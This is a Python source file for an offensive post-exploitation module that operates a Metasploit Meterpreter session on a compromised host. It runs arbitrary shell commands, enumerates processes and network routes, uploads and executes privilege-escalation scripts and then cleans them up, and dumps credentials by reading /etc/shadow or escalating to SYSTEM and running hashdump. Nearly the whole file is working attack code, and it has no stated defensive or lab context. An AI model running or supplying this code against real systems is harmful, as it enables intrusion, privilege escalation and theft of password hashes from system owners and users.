
import logging
import os
import time
from typing import Any, Optional, Dict, List

logger = logging.getLogger(__name__)

class PostExploitationModule:
    """
    Handles post-exploitation activities on a compromised host using an active
    Metasploit Meterpreter session.
    """
    def __init__(self, session: Any):
        if not session or not hasattr(session, 'write'):
            raise ValueError("A valid Meterpreter session object is required.")
        self.session = session
        self.is_windows = 'windows' in self.session.info.get('platform', '')
        logger.info(f"Post-exploitation module initialized for session {self.session.sid}. Target OS: {'Windows' if self.is_windows else 'Linux/Other'}")

    def execute_command(self, command: str, timeout: int = 10) -> str:
        """Execute a command in the session's shell and return the output."""
        try:
            logger.info(f"Executing command: '{command}' on session {self.session.sid}")
            # Open a shell on the target if not already done
            if not self.session.shell:
                self.session.shell_open()
            
            self.session.shell_write(command + '\n')
            
            # Wait for output
            time.sleep(timeout) 
            output = self.session.shell_read()
            logger.info(f"Command output:\n{output}")
            return output
        except Exception as e:
            logger.error(f"Error executing command '{command}': {e}")
            return f"Error: {e}"

    def get_system_info(self) -> Dict[str, Any]:
        """Get structured system information from the target using Meterpreter's API."""
        logger.info("Gathering basic system information via Meterpreter API...")
        try:
            info = self.session.sys.info.info()
            logger.info(f"System Info: {info.get('computer_name')}, OS: {info.get('os_name')}")
            return info
        except Exception as e:
            logger.error(f"Failed to get system info via API, falling back to shell command: {e}")
            # Fallback for non-meterpreter sessions or errors
            output = self.execute_command('systeminfo' if self.is_windows else 'uname -a && id')
            return {'raw_output': output}

    def list_processes(self) -> List[Dict[str, Any]]:
        """List running processes on the target."""
        logger.info("Listing running processes...")
        try:
            processes = self.session.sys.process.get_processes()
            logger.info(f"Found {len(processes)} running processes.")
            return processes
        except Exception as e:
            logger.error(f"Failed to list processes: {e}")
            return []

    def get_network_info(self) -> Dict[str, Any]:
        """Get network interface and route information."""
        logger.info("Gathering network information...")
        try:
            interfaces = self.session.net.config.get_interfaces()
            routes = self.session.net.config.get_routes()
            return {'interfaces': interfaces, 'routes': routes}
        except Exception as e:
            logger.error(f"Failed to get network info: {e}")
            return {}

    def check_privileges(self) -> str:
        """Check the current user privileges."""
        logger.info("Checking user privileges...")
        try:
            return self.session.sys.config.getuid()
        except Exception as e:
            logger.error(f"Failed to get UID: {e}")
            return "Unknown"

    def run_privesc_scripts(self, peas_path: str) -> str:
        """Upload and execute privilege escalation scripts like WinPEAS or LinPEAS."""
        if not os.path.exists(peas_path):
            logger.error(f"Privilege escalation script not found at: {peas_path}")
            return f"Error: Script not found at {peas_path}"

        script_name = os.path.basename(peas_path)
        target_path = f"/tmp/{script_name}" if not self.is_windows else f"C:\\Windows\\Temp\\{script_name}"

        try:
            logger.info(f"Uploading {script_name} to {target_path}...")
            self.session.upload_file(local_path=peas_path, remote_path=target_path)
            logger.success(f"Upload complete.")

            logger.info(f"Executing {script_name} on target...")
            if self.is_windows:
                # For .bat files
                output = self.execute_command(f'cmd.exe /c {target_path}', timeout=120)
            else:
                # For .sh files
                self.execute_command(f'chmod +x {target_path}')
                output = self.execute_command(target_path, timeout=120)
            
            logger.info("Cleaning up script from target...")
            self.execute_command(f'del {target_path}' if self.is_windows else f'rm {target_path}')
            return output

        except Exception as e:
            logger.error(f"Failed to run privilege escalation script: {e}")
            return f"Error: {e}"

    def run_enumeration(self) -> Dict[str, Any]:
        """Run a full suite of enumeration tasks and return a comprehensive dictionary."""
        logger.info("Starting comprehensive post-exploitation enumeration...")
        results = {}
        results['privileges'] = self.check_privileges()
        results['system_info'] = self.get_system_info()
        results['processes'] = self.list_processes()
        results['network_info'] = self.get_network_info()
        logger.info("Comprehensive enumeration complete.")
        return results

    def dump_credentials(self) -> str:
        """Attempt to dump credentials from the target system."""
        logger.info("Attempting to dump credentials...")
        try:
            if not self.is_windows:
                logger.warning("Credential dumping is primarily for Windows targets. Trying to read /etc/shadow.")
                return self.execute_command('cat /etc/shadow')

            # For Windows, use Metasploit's hashdump or kiwi
            if 'meterpreter' not in self.session.type:
                logger.error("Credential dumping requires a Meterpreter session.")
                return "Error: Not a Meterpreter session."

            logger.info("Executing hashdump...")
            # Ensure we have system privileges first
            if not self.session.sys.config.is_system():
                logger.warning("Not running as SYSTEM. Trying to get system...")
                if not self.session.sys.config.getsystem():
                    logger.error("Failed to escalate to SYSTEM. Hashdump will likely fail.")
                    return "Error: Could not get SYSTEM privileges."
            
            hashes = self.session.sys.config.hashdump()
            output = "\n".join([f"{h['user_name']}:{h['lm_hash']}:{h['nt_hash']}" for h in hashes])
            logger.success(f"Successfully dumped hashes:\n{output}")
            return output

        except Exception as e:
            logger.error(f"Credential dumping failed: {e}")
            return f"Error: {e}"

